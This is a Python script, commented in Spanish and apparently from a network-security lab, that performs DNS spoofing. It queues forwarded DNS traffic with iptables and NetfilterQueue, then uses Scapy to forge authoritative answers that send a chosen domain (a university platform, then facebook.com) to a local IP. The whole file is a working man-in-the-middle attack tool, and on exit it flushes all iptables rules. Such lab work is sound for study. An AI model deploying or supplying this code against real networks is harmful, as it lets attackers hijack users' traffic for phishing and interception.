from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

# Este es el dominio que quiero spoofear
domain = 'plataforma-fi.ude.edu.uy'
domain = 'facebook.com'

# Esta es la ip a la que voy a redirigir
ipSpoofeada = '192.168.253.246'

# Regla de IP tables para que los paquetes forwardeados por mi PC con puerto de destino 53 se encolen.
os.system('iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1')

# Función que se ejecuta cada vez que se encola un paquete.
# Entrada: paquete de NFQUEUE
# Salida: ninguno. adentro acepta el paquete o lo dropea y envía uno spoofeado
def callback(p):
    # Parseo el paquete de NFQUEUE a un paquete entendible por Scapy
    pkt = IP(p.get_payload())
    try:
        # Si el paquete tiene la capa DNS
        if(pkt["DNS"]):
            # Me fijo si es una pregunta o respuesta de DNS y lo intercepto
            if pkt.qdcount > 0 and isinstance(pkt.qd, DNSQR):
                name = pkt.qd.qname
            elif pkt.ancount > 0 and isinstance(pkt.an, DNSRR):
                name = pkt.an.rdata
            else:
                print("")
            # Si la query tiene el nombre que quiero spoofear en el DNS, lo intercepto, hago un nuevo paquete
            # y mando mi paquete spoofeado
            if(domain in str(name)):
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
                    DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=100, rdata=ipSpoofeada))
                send(spoofed_pkt)

                print("Paquete spoofeado enviado para: " + name)
            else:
                # Si no es una direccion que quiero spoofear acepto el paquete.
                print("Paquete aceptado para la url: " + name)
                p.accept()
    except:
        # Si ocurrio una excepción no hago nada
        pass


# Hilo principal de ejecucion.
def main():
    # Creo una cola para los paquetes
    NFQUEUE = NetfilterQueue()
    # Adjunto la cola creada con un callback y al número 1
    NFQUEUE.bind(1, callback)
    try:
        NFQUEUE.run()  # Pongo a correr la cola de paquetes
    except KeyboardInterrupt:
        # Si cancelo el programa limpio las reglas del IP tables que cree.
        NFQUEUE.unbind()
        os.system('iptables -F')
        os.system('iptables -X')
        sys.exit('Cerrando...')


# Ejecucion del programa.
main()


""" os.system('iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE') """
""" os.system('iptables -t nat PREROUTING -p udp --dport 53 -j NFQUEUE') """
""" os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1') """
""" os.system('iptables -A OUTPUT -d 192.168.255.0/24 -j NFQUEUE --queue-num 1')"""
""" os.system('iptables -I INPUT -p udp --dport 53 -j NFQUEUE --queue-num 1') 
os.system('iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 1') """
